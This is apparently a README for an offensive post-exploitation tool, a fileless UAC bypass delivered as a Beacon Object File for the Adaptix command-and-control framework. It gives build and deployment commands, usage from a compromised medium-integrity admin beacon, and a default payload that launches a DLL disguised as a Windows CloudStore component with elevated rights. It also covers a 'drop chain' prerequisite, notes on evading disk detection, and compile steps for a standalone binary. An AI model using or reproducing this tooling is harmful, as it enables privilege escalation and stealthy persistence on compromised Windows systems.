# JealousMonkey

Fileless UAC bypass BOF — AppInfo Method 59 (debug object). Same logic as [method59.c](../method59.c) / `meth.exe`, runs in-memory via Adaptix `execute bof`.

## Build

```bash
cd DriversCloud/STAGE2/UACbof
make
```

Output: `_bin/jealousmonkey.x64.o`

Requires MinGW cross-compiler and beacon headers at `/SADDLEBACK/bofs/Extension-Kit/_include`.

## Deploy to Adaptix server

Copy to your script directory:

```text
jealousmonkey.axs
_bin/jealousmonkey.x64.o
```

Load `jealousmonkey.axs` in Adaptix (or place under your scripts tree and reload).

## Usage

From a **medium-integrity local admin** beacon:

```text
jealousmonkey
```

Default payload (built at runtime from `%LOCALAPPDATA%`):

```text
C:\Windows\System32\rundll32.exe "%LOCALAPPDATA%\Microsoft\Windows\CloudStore\Shell\Windows.CloudStore.Schema.Shell.dll",Start
```

Custom payload:

```text
jealousmonkey c:\windows\system32\rundll32.exe "C:\path\to\payload.dll",Start
```

## Expected result

```text
[*] JealousMonkey UAC bypass
[*] Launching elevated child via AppInfo RPC...
[+] SUCCESS: high-integrity payload spawned
```

Verify with Process Explorer or your implant check: new `rundll32.exe` at **High (Elevated)** integrity loading the CloudStore DLL.

## Prerequisites

- User in local Administrators group (UAC-filtered medium token is fine)
- CloudStore Shell DLL already on disk (STAGE drop chain)
- x64 beacon only (AppInfo stubs are AMD64)

## Notes

- BOF is large (~50–80KB) due to MIDL RPC stubs
- AppInfo RPC thread-pool race can cause intermittent failure (same as standalone `meth.exe`)
- No new unknown PE on disk — bypass code runs inside beacon process memory

## Lab binary

For offline testing without C2, rebuild standalone exe from parent directory:

```bash
cd DriversCloud/STAGE2
x86_64-w64-mingw32-gcc -municode -o meth.exe method59.c appinfo64.c \
  -lrpcrt4 -lntdll -lkernel32 -luser32 -ladvapi32 -Os -s
```

Same default `%LOCALAPPDATA%` payload path as the BOF.
